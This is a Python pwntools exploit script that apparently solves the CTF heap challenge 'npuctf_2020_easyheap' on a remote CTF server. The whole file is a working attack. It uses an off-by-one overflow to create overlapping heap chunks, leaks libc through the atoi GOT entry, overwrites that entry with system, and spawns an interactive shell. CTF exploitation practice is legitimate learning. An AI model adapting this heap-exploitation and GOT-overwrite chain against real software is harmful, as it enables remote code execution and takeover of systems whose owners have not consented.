from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./npuctf_2020_easyheap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25800)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

def add(size, con):
    sa("Your choice :", "1")
    sa("Size of Heap(0x10 or 0x20 only) : ", str(size))
    sa("Content:", con)

def edit(index, con):
    sa("Your choice :", "2")
    sa("Index :", str(index))
    sa("Content: ", con)

def show(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))

def free(index):
    sa("Your choice :", "4")
    sa("Index :", str(index))


# off by one

# chunk overlap
add(0x18, "0")
add(0x18, "1")
edit(0, cyclic(0x18)+p8(0x41))
free(1)
add(0x38, "1")

# leak
pro = ELF("./npuctf_2020_easyheap")
atoi_g = pro.got["atoi"]

edit(1, cyclic(0x10)+p64(0)+p64(0x21)+p64(0x8)+p64(atoi_g))
show(1)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["atoi"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system
edit(1, p64(system))

# attack
sa("Your choice :", "sh\x00\x00")

shell()


